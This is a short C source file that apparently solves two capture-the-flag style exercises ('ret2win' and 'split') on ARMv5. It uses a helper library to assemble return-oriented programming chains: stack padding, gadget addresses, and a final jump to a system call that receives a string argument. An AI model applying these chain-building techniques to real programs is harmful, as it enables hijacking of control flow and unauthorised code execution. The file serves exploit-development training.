/**
 * ROPDump
 */

#include <ropdump.h>

# define	ROP_GADGET(X, ...) { rop_addr(ADDR_GADGET); rop_gadget(X, ##__VA_ARGS__); }

# define	ARCH_CALL(_arch, _name)	_arch##_##_name

void
ARCH_CALL(armv5, ret2win)(void)
{
	rop_opt_set(RD_INIT | RD_WORD_32);
	rop_begin();
		rop_padding(36);
		rop_addr(ADDR_CODE);
		rop_name("ret2win address, popped as pc");
	rop_end();
	rop_dump();
	rop_destroy();
}

void
ARCH_CALL(armv5, split)(void)
{
	rop_opt_set(RD_INIT | RD_WORD_32);
	rop_begin();
		rop_padding(36);
		rop_addr(ADDR_GADGET);
		rop_gadget("pop {r3, pc}", NULL);
		rop_name("old pc");
		rop_addr(ADDR_OTHER);
		rop_name("usefulString address, popped as r3");
		rop_addr(ADDR_GADGET);
		rop_gadget("mov r0, r3", "pop {fp, pc}", NULL);
		rop_name("popped as pc");
		rop_addr(ADDR_OTHER);
		rop_name("popped as fp");
		rop_addr(ADDR_CODE);
		rop_name("sytem call, popped as pc");
	rop_end();
	rop_dump();
	rop_destroy();
}

int main(void)
{
//	armv5_ret2win();
	armv5_split();
}
